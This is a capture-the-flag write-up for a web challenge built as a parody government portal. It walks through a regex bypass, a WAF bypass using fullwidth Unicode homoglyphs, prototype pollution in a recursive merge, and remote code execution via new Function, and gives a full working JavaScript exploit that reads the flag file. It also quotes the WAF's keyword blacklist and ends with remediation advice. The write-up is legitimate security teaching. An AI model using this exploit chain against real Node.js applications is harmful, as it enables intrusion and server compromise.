# babu bhaiya — CTF Writeup

Oct 10, 2026 · @Rank The Top 30 Countries On Their Contibutions To DigitiAtion O

**Category:** Web Exploitation  ·  **Points:** 100  ·  **Difficulty:** Medium **Target:** `https://babubhaiya-eight.vercel.app/`  ·  **Stack:** Node.js / Express on Vercel

**Flag:** `GPI{b4bu_j1_k0_ch41_p1l40_0bj3ct_pr0t0typ3_p0llut10n_r0xx_9999}`

---

## TL;DR

The challenge is a parody "government tatkal portal." The intended path chains four tricks against `POST /api/v1/tatkal/apply`:

1. **Bribe-regex bypass** — send `X-Chai-Paani: 1e4` (a non-decimal number that passes `Number() >= 1000` but dodges the anti-corruption regex).
2. **WAF bypass via Unicode NFKC** — the keyword blacklist inspects the *raw* body, but the server normalizes input *afterwards*; write every banned token with fullwidth homoglyphs.
3. **Prototype pollution** — a `__proto__` key (surviving as a real own property thanks to `Object.defineProperty`) flows through a naive recursive merge onto `Object.prototype`.
4. **RCE** — the polluted `enableMacro` / `macroExpression` turn the challan engine's `new Function(...)` into arbitrary code execution; read `flag.txt`.

---

## 1. Recon

The landing page is `Form 420-B`, a fake tatkal application. Useful breadcrumbs in the sidebar:

- **RTI Disclosure → `/rti.html`** — points to a source-code endpoint.
- **Citizen Sitemap → `/robots.txt`**
- **Live Counter 4 Status → `/api/v1/tatkal/status`** — returns a *decoy* flag.

`/rti.html` drops two key hints and the source location:

> "All inputs are standardized as per National Unicode Standardization Directives." Source endpoint: `/api/v1/dev/source`

`/api/v1/dev/source` streams the full Express app via `fs.createReadStream(__filename)`. **The `GPI{...}` strings in the session cookie and in `/status` are decoys** — the real flag lives in `flag.txt`.

---

## 2. The target route and its guards

```js
app.post('/api/v1/tatkal/apply',
  humanAttestationGuard, aiHoneypotTrap, bribeGuard, sanskarWAF,
  (req, res) => {
    const rawApplicant = req.body.applicant || {};
    const normalizedApplicant = normalizeUnicodeInput(rawApplicant); // NFKC
    const masterRecord = { appliedAt, bribeReceived: req.bribeAmount };
    mergeApplicantData(masterRecord, normalizedApplicant);           // vulnerable merge
    const challan = new SarkariChallanEngine().render(masterRecord);  // new Function sink
    ...
  });
```

The `render()` sink only fires with a polluted prototype:

```js
if (this.options.enableMacro) {
  const macroFn = new Function('applicant','options',
    this.options.macroExpression || "return 'APPROVED_BY_CHIEF_BABU';");
  return macroFn(applicant, this.options);
}
```

### Guard 1 — humanAttestationGuard

Needs the `babu_session` cookie **or** header `X-Human-Attestation: NotAnAI-BabuJiKiKasam`. A browser already has the cookie; scripts can just send the header.

### Guard 2 — aiHoneypotTrap

Blocks only if `applicant.ai_prompt_override_secret` is present. Don't send it.

### Guard 3 — bribeGuard (type confusion)

```js
const amount = Number(bribe);
if (isNaN(amount) || amount < 1000) reject();
if (/^[1-9]\d{3,}(\.\d+)?$/.test(String(bribe).trim())) reject(); // CBI raid
```

The regex rejects normal decimals ≥ 1000. **Scientific notation `1e4`** gives `Number("1e4") === 10000` (passes the numeric check) while the regex never matches. `0x3e8` works too.

### Guard 4 — sanskarWAF (raw-body blacklist)

Scans **`req.rawBody`** (lowercased) for: `__proto__, constructor, prototype, child_process, process, global, mainmodule, exec, spawn, eval, function, require, import, fs, buffer`. Crucially it runs **before** normalization — see next section.

---

## 3. The core bugs

### NFKC normalization applied *after* the WAF

```js
function normalizeUnicodeInput(obj) {
  if (typeof obj === 'string') return obj.normalize('NFKC');
  // ... for objects, normalizes keys too, via defineProperty
  Object.defineProperty(normalized, normKey, { value: ..., enumerable: true, writable: true, configurable: true });
}
```

Any banned token written with **fullwidth Unicode** (e.g. `ｐｒｏｃｅｓｓ`) is invisible to the raw-body check but folds back to ASCII (`process`) before it is used. This defeats the entire blacklist.

`defineProperty` also matters: normalizing a key `__proto__` creates a **real own, enumerable data property** named `__proto__` (shadowing the usual accessor) — which is what lets it survive into the merge.

### Prototype pollution in the merge

```js
function mergeApplicantData(target, source) {
  for (const key of Object.keys(source)) {
    if (isObject(source[key]) && !Array.isArray(source[key])) {
      if (!isObject(target[key])) target[key] = {};
      mergeApplicantData(target[key], source[key]);
    } else { target[key] = source[key]; }
  }
}
```

With `source` carrying an own `__proto__` object, `target["__proto__"]` resolves to `Object.prototype`, and the recursion writes `enableMacro` / `macroExpression` straight onto it. Now **every** object (including the engine's `this.options`) inherits them → `new Function` RCE.

---

## 4. Exploit

Run from the target origin (so cookies ride along) — e.g. the browser DevTools console on the site. A helper rewrites banned tokens as fullwidth so the raw body is clean; the server's NFKC pass restores them.

```js
// fullwidth homoglyph encoder: a-z A-Z 0-9 -> U+FFxx, NFKC-reversible
const fw = s => [...s].map(c => {
  const o = c.charCodeAt(0);
  if (o>=0x41&&o<=0x5A) return String.fromCharCode(o-0x41+0xFF21);
  if (o>=0x61&&o<=0x7A) return String.fromCharCode(o-0x61+0xFF41);
  if (o>=0x30&&o<=0x39) return String.fromCharCode(o-0x30+0xFF10);
  return c;
}).join('');

// macro body (reads the flag). Everything alphanumeric is homoglyphed.
const code = "var F=process.mainModule.require('fs');"
  + "return F.readFileSync('/var/task/flag.txt','utf8');";

const body = JSON.stringify({
  applicant: {
    ["__"+fw("proto")+"__"]: {        // __proto__ with fullwidth middle
      enableMacro: true,
      macroExpression: fw(code)
    }
  }
});

const r = await fetch('/api/v1/tatkal/apply', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Chai-Paani': '1e4',                              // bribe-regex bypass
    'X-Human-Attestation': 'NotAnAI-BabuJiKiKasam'      // proof-of-humanity
  },
  body
});
console.log((await r.json()).challan);
```

**Finding the path:** a first recon macro (`return process.env.FLAG_PATH + '|' + process.cwd()`) showed `FLAG_PATH` was unset (so it defaults to `__dirname/flag.txt`) and `cwd = /var/task`. Walking `/var/task` located `flag.txt` at the app root.

---

## 5. Flag

```
GPI{b4bu_j1_k0_ch41_p1l40_0bj3ct_pr0t0typ3_p0llut10n_r0xx_9999}
```

---

## 6. Remediation notes

- **Normalize before validating**, never after — any raw-byte filter is void once the string is later transformed (Unicode, URL-decode, etc.).
- **Reject `__proto__` / `constructor` / `prototype` keys** in merges, use `Object.create(null)` or a `Map`, or `hasOwnProperty` guards; prefer a vetted deep-merge.
- **Never feed request data into `new Function` / `eval`**, and don't gate code paths on inherited (non-own) properties.
- Validate numeric input by range on the parsed value, not by regex on the string; `Number()` accepts hex, scientific, `Infinity`, leading `+`, whitespace, etc.
- Blacklists are brittle; prefer allow-lists and structural validation (schema) over keyword matching.
